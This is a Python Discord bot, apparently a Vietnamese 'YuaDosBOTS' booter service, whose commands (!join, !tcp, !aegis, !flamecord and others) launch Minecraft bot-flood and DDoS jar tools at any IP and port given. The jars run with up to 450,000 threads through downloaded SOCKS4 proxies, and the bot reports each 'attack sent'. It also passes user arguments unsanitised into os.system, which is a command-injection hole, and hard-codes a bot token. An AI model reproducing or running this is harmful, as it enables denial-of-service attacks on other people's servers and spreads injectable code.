import discord
from discord.ext import commands

intents = discord.Intents.default() 
# This will enable the default set of intents
client = commands.Bot(command_prefix='!', intents=intents)

import os
import threading
import requests
import urllib.request
import json
import asyncio
import sqlite3
from discord import Member

token = "T1RJeU5ETTNOekF5TkRJeE5EYzVORFUwLkd0dnBxai4tNUg3MVhUcEl2Tll1ZXN2dHBqaGI5Y3owMG5DSzgxVE4xalZLSQ=="

client.remove_command('help')


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.idle, activity=discord.Game(name='YuaDosBOTS'))
    print("Bot Đã Khởi Chạy")


@client.command()
async def proxy(ctx):
    def update():
        os.system('rm socks4.txt')
        os.system('wget https://api.openproxylist.xyz/socks4.txt')

    t1 = threading.Thread(target=update)

    t1.start()

    await ctx.send("Proxy đã được cập nhật")


@client.command()
@commands.has_permissions(manage_messages=True)
async def stop(ctx):
    os.system("pkill 'java'")
    embed = discord.Embed(
        title='Ngừng tấn công!',
        description=f'Tất cả các cuộc tấn công đã dừng thành công!',
        color=discord.Colour.orange()
    )

    await ctx.send(embed=embed)

@client.command()
async def join(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"screen -d -m timeout 30 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 2 35 {arg3} 160 socks4.txt socks4")

    embed = discord.Embed(
        title='Cuộc tấn công được gửi!',
        description=f'Tấn công được gửi thành công!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='Port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='join', inline=False)
    embed.add_field(name='duracion:', value=f'60 secondss', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def randombytes(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"screen -d -m timeout 30 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 3 35 {arg3} 160 socks4.txt socks4")

    embed = discord.Embed(
        title='Đã gửi tấn công!',
        description=f'Tấn công được gửi thành công!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='IP:', value=f'{arg1}', inline=False)
    embed.add_field(name='Attack:', value=f'{arg2}', inline=False)
    embed.add_field(name='Method:', value='RandomBytes', inline=False)
    embed.add_field(name='Thời Gian Tấn Công:', value=f'60 secondss', inline=False)
    embed.add_field(name='Protocol(Version):', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def motd(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 1 35 {arg3} 160 socks4.txt socks4")

    embed = discord.Embed(
        title='Đã gửi tấn công!',
        description=f'Tấn công được gửi thành công!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='Port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='Motd', inline=False)
    embed.add_field(name='duracion:', value=f'60 secondss', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def join2(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -jar mango.jar host={arg1} port={arg2} pfile=socks4.txt resolve=false threads=450000 time=80 method=ping_join version=754")
        os.system(f"")
    embed = discord.Embed(
        title='Đã gửi tấn công!',
        description=f'Tấn công được gửi thành công!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='Port:', value=f'{arg2}', inline=False)
    embed.add_field(name='duracion:', value=f'60 secondss', inline=False)
    embed.add_field(name='method:', value='JOIN4', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)

@client.command()
async def tcp(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=false -Dlen=25555 -jar tcp.jar {arg1} 7 9000 {arg2} 60 socks4_proxies.txt socks4")
        os.system(f"")
    embed = discord.Embed(
        title='Đã gửi tấn công!!',
        description=f'Tấn công được gửi thành công!!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='protocolo:', value=f'{arg2}', inline=False)
    embed.add_field(name='duracion:', value=f'60 secondss', inline=False)
    embed.add_field(name='method:', value='TCP-JOIN-BOT', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)
@client.command()
async def tcp1(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=false -Dlen=25555 -jar tcp.jar {arg1} 5 9000 {arg2} 60 socks4_proxies.txt socks4")
        os.system(f"")
    embed = discord.Embed(
        title='Đã gửi tấn công!!',
        description=f'Tấn công được gửi thành công!!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='protocolo:', value=f'{arg2}', inline=False)
    embed.add_field(name='duracion:', value=f'60 secondss', inline=False)
    embed.add_field(name='method:', value='TCP-PING-JOIN', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)

@client.command()
async def bungee(ctx, arg1):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=false -Dlen=25555 -jar tcp.jar {arg1} 3 9000 4 60 socks4_proxies.txt socks4")
        os.system(f"")
    embed = discord.Embed(
        title='Đã gửi tấn công!!',
        description=f'Tấn công được gửi thành công!!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='duracion:', value=f'60 seconds', inline=False)
    embed.add_field(name='method:', value='BUNGEE-JOIN-BOT', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    embed = discord.Embed(
        title="Métodos",
        color=discord.Colour.red()
    )
    embed.add_field(name='Join 1.8', value='!join <ip> <Port> <protocol>')
    embed.add_field(name='Ping 1.16.X', value='!join2 <ip> <Port>', inline=False)
    embed.add_field(name='Flamecord', value='!flamecord <ip> <Port>', inline=False)
    embed.add_field(name='Aegis', value='!aegis <ip> <Port>', inline=False)
    embed.add_field(name='RandomBytes', value='!randombytes <ip> <Port> <protocol>', inline=False)
    embed.add_field(name='Nantibot (beta 0.0.1)', value='!nantibot <ip> <Port>', inline=False)
    embed.add_field(name='Motd', value='!motd <ip> <Port> <protocol>', inline=False)
    embed.add_field(name='TCP JOIN', value='!tcp <dominio> <protocol>', inline=False)
    embed.add_field(name='TCP PING', value='!tcp1 <dominio> <protocol>', inline=False)
    embed.add_field(name='BUNGEECORD JOIN', value='!bungee <dominio>', inline=False)
    embed.add_field(name='Nhận ip số', value='!mc <dominio>', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_footer(text="YuaVN.tech @ 2023")
    await ctx.send(embed=embed)


@client.command()
async def mc(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Resuelto!",
        color=discord.Colour.red()
    )
    embed.add_field(name="Host:", value=json_object["hostname"], inline=False)
    embed.add_field(name='IP SỐ:', value=json_object["ip"], inline=False)
    embed.add_field(name='Port:', value=json_object["port"], inline=False)
    embed.add_field(name="Protocol:", value=json_object["protocol"], inline=False)
    embed.add_field(name="Máy Chủ Onlines:", value=json_object["online"], inline=False)


    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{g}/{gb}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")
    await ctx.send(embed=embed)


@client.command()
async def aegis(ctx, arg1, arg2):
    def attack():
        os.system(
            f"screen -d -m java -jar SynexHub_obf.jar host={arg1} port={arg2} threads=10000 file=socks4.txt method=aegis timeout=1000 loop=300")
        os.system(f"")

    embed = discord.Embed(
        title='Đã gửi tấn công!!',
        description=f'Tấn công được gửi thành công!!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='Port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='join', inline=False)
    embed.add_field(name='protocol:', value=f'1.8', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)

@client.command()
async def flamecord(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -jar SynexHub_obf.jar host={arg1} port={arg2} threads=25000 file=socks4.txt method=bypass timeout=1000 loop=300")

    embed = discord.Embed(
        title='Đã gửi tấn công!!',
        description=f'Tấn công được gửi thành công!!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='Port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='ShitCord (flamecord) bypass', inline=False)
    embed.add_field(name='protocol:', value='47', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()

    await ctx.send(embed=embed)

@client.command()
async def nantibot(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -jar SynexHub_obf.jar host={arg1} port={arg2} threads=18000 file=socks4.txt method=bypass timeout=1000 loop=300")

    embed = discord.Embed(
        title='Đã gửi tấn công!!',
        description=f'Tấn công được gửi thành công!!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='Port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='Nantibot (beta) bypass', inline=False)
    embed.add_field(name='protocol:', value='4', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/982279648023019540/1104023670650851458/Picsart_23-01-24_19-08-09-658.png')
    embed.set_image(url=f'http://status.mclive.eu/SirWorldBan/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="YuaVN.tech @ 2023")

    t1 = threading.Thread(target=attack)

    t1.start()

    await ctx.send(embed=embed)
client.run(token)
